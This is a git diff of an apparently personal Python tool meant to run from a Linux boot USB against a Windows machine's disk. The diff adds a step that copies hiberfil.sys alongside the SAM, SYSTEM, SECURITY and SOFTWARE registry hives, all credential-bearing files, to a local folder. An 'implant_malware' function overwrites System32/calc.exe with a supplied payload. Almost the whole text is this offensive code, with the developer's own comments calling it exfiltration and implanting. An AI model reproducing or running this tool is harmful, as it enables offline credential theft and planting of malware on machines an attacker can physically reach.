@@ -4,6 +4,8 @@
 # Description: Meant to be run on a linux bootable usb. Program scans for all connected storage devices and looks for specific 
 # file systems to mount and then exfils data. Only looks for NTFS and exfils the calc.exe program for now.
 
+#maybe import os?
+
 import sys, subprocess, argparse, time, shutil
 
 class Drive:
@@ -54,18 +56,19 @@ def copy_winpayload():
     # gotta use the mount point made by mount_drive here from the user input
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
+
+    #^^^ dumb idea probably. A good idea wouldl be to refactor this and get rid of the shit hardcoded values for copy dest!
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
         shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/zigmo/Desktop/SYSTEM')
         shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
         shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
-        print('Sytem and Sam registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
+        shutil.copyfile('/media/windows/hyberfil.sys', '/home/zigmo/Desktop/hyberfil.sys')
+        print('hybernation file has been exfiltrated to /home/zigmo/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
     except FileNotFoundError:
         print('drive not exploitable')
-    
-    # subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
-    # subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
-    
+
+    #optimize this...
     time.sleep(1)
     subprocess.Popen("sudo umount /media/windows", shell=True)
     print('Drive has been unmounted from /media/windows')
@@ -86,7 +89,8 @@ def store_drives(raw_drives):
         obj_drives.append(temp_drive)
     return obj_drives
 
-def list_windrives(drives):
+def list_n_target_windrives(drives):
+    #looking back this code is actually so trash. Gotta refactor.
     drive_count = 0
     raw_win_drives = locate_winfs(drives)
     win_drives = store_drives(raw_win_drives)
@@ -109,7 +113,7 @@ def implant_malware():
         #I need to implemnt something instead of hardcoding /media/windows
         shutil.copyfile('/media/windows/Windows/System32/calc.exe', '/media/windows/Windows/System32/calc.exe.bak')
         shutil.copyfile('/calc.exe', '/media/windows/Windows/System32/')
-        print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+        print('[*] payload has been uploaded to the host')
     except FileNotFoundError:
         print('drive not exploitable')
 
@@ -117,8 +121,11 @@ def implant_malware():
 
     # shutil.copyfile('/calc.exe', '/media/windows/Windows/System32/')
 
+
+
+
+
 def pretty_print(drives):
-    apl_drives = linux_drives =  allpurpose_drives = win_drives = []
     subprocess.call('cat assets/ascii_art', shell=True)
     print("\n\n\t\t\t    *********************************************************************************************",end ="")
     print("\n\t\t\t    ***********************************A TABLE OF ALL CONNECTED DEVICES**************************",end ="")
@@ -137,17 +144,18 @@ def main():
     group.add_argument('-w', '--hives', action='store_true')
     group.add_argument('-i', '--implant', action='store_true')
     args = parser.parse_args()
+
     drives = grab_drives()
-    all_drives = store_drives(drives)
+    conected_drives = store_drives(drives)
     if args.hives:
-        if list_windrives(drives):
+        if list_n_target_windrives(drives):
             copy_winpayload()
     elif args.implant:
-        if list_windrives(drives):
+        if list_n_target_windrives(drives):
             implant_malware()
         
     elif not len(sys.argv) > 1:
-        pretty_print(all_drives)
+        pretty_print(conected_drives)
     else:
         print("invalid flag")
 
